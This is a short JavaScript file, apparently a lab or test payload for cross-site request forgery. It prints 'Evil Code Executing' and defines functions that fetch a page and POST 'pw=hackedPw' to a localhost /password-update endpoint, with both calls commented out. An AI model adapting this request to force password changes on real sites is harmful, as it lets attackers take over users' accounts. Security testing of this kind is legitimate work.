console.log("Evil Code Executing");

var get = () => {
	var GET_URL = 'http://localhost:3334/test.html';
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = () => {
		if (xhttp.readyState == 4) {
			console.log("status: ", xhttp.status);
			console.log('GET xhttp.responseText: ', xhttp.responseText);
		}
	};
	xhttp.open("GET", GET_URL, true);
	xhttp.send();
};

var post = () => {
	var POST_URL = 'http://localhost:3334/password-update';
	var xhr = new XMLHttpRequest();
	xhr.open("POST", POST_URL, true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.onreadystatechange = function() {//Call a function when the state changes.
			if(this.readyState == XMLHttpRequest.DONE) {
				console.log("status: ", xhr.status);
				console.log('POST xhr.responseText: ', xhr.responseText);
			}
	}
	xhr.send("pw=hackedPw");
}

// get();
// post();
